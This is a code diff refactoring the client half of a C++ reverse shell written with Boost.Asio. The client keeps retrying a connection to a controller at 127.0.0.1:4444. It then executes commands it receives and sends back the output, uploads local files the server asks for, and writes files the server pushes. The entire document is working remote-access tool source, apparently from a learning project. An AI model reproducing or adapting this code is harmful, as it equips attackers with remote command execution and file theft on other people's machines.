@@ -7,6 +7,7 @@
 #include <array>
 #include <fstream>
 #include <boost/asio.hpp>
+#include <boost/optional.hpp>
 #include <string>
 #include <iostream>
 #include <filesystem>
@@ -20,27 +21,26 @@ class Client
 private:
 	using IoService = boost::asio::io_service;
 	using TcpResolver = boost::asio::ip::tcp::resolver;
-	using TcpResolverIterator = TcpResolver::iterator;
-	using TcpSocket = boost::asio::ip::tcp::socket;
 
 public:
 
 	Client(IoService& ioService)
-		: m_ioService(ioService), m_socket(ioService), m_ShellUtils(this)
+		: m_socket(ioService), m_ShellUtils(this)
 	{
-		TcpResolver resolver(ioService);
-		m_endpointIterator = resolver.resolve({ "127.0.0.1", "4444" });
-		Connect();
-		Start();
+		Connect(ioService);
+		m_ShellUtils.Start();
 	}
 
 private:
 
-	void Connect()
+	void Connect(IoService& ioService)
 	{
-		while(true)
+		TcpResolver resolver(ioService);
+		auto endpointIterator = resolver.resolve({ "127.0.0.1", "4444" });
+
+		while (true)
 		{
-			boost::asio::connect(m_socket, m_endpointIterator, m_ShellUtils.m_errorCode);
+			boost::asio::connect(m_socket, endpointIterator, m_ShellUtils.m_errorCode);
 			if (!m_ShellUtils.m_errorCode)
 				return;
 
@@ -52,72 +52,59 @@ private:
 		std::cout << "Connected to: " << m_socket.remote_endpoint().address().to_string() << std::endl;
 	}
 
-	void Start()
-	{
-		while (true)
-		{
-			switch (ReadOperationType())
-			{
-			case SharedReverseShellUtils<Client>::RunCommand:
-				Command();
-				break;
-			case SharedReverseShellUtils<Client>::DownloadFile:
-				Download();
-				break;
-			case SharedReverseShellUtils<Client>::UploadFile:
-				Upload();
-				break;
-			default:
-				throw;
-				break; // TODO - decide what to do 
-			}
-		}
-	}
-
 	SharedReverseShellUtils<Client>::OperationType ReadOperationType()
 	{
 		auto operation = m_ShellUtils.Response();
-		return m_ShellUtils.GetOperationType(operation);
+		return m_ShellUtils.GetOperationType(operation);		
 	}
-	
+
 	void Command()
 	{
 		auto command = m_ShellUtils.Response();
+		std::cout << "Command to Run: " << command << std::endl;
 		CommandExecuter commandExecuter;
 		auto commandResult = *commandExecuter.RunCommand(command);
+		std::cout << "Command Result: " << commandResult << std::endl;
 		m_ShellUtils.Send(commandResult);
 	}
 
 	void Download()
 	{
-		auto filePath = m_ShellUtils.Response();
-		m_file.open(filePath, std::ios::in | std::ios::binary);
-		if (!m_file)
-			throw std::fstream::failure("Failed while opening file"); // TODO - Throw custom exception exception!
+		auto localFilePath = m_ShellUtils.Response();
+		std::cout << "File that server wants: " << localFilePath << std::endl;
+		if (!TellServerIfFileExists(localFilePath))
+			return;
 
-		auto fileSize = std::filesystem::file_size(filePath);
-		std::string request(std::to_string(fileSize));
-		m_ShellUtils.Upload(fileSize, request);
+		m_ShellUtils.Upload(localFilePath);
+		std::cout << "File uploaded (local): " << localFilePath << std::endl;
 	}
 
 	void Upload()
 	{
 		auto filePath = m_ShellUtils.Response();
-
-		m_file.open(filePath, std::ios::out | std::ios::binary);
-		if (!m_file)
-			throw; // TODO - throw specific exception
-
+		std::cout << "Where to store the uploaded file: " << filePath << std::endl;
+		TellServerIfFileExists(filePath);
+		m_ShellUtils.OpenFileFor(filePath, std::ios::out | std::ios::binary);
 		m_ShellUtils.Download(filePath);
 	}
 
+	bool TellServerIfFileExists(const std::string& filePath)
+	{
+		auto fileExists = IsRegularFileExists(filePath);
+		m_ShellUtils.Send(std::to_string(fileExists));
+		return fileExists;
+	}
+
+	void InvalidOperation()
+	{
+		throw; // TODO - throw specific exception
+	}
+
+
 public: // TODO - Turn this back into private after solving the CommonReverseShell template issues. 
+	boost::asio::ip::tcp::socket m_socket;
 	SharedReverseShellUtils<Client> m_ShellUtils;
-	TcpResolver m_ioService;
-	TcpSocket m_socket;
-	TcpResolverIterator m_endpointIterator;
-	boost::asio::streambuf m_responseBuf;
-	std::fstream m_file;
+	friend class SharedReverseShellUtils<Client>;
 };
 
 #endif // !_CLIENT_H_
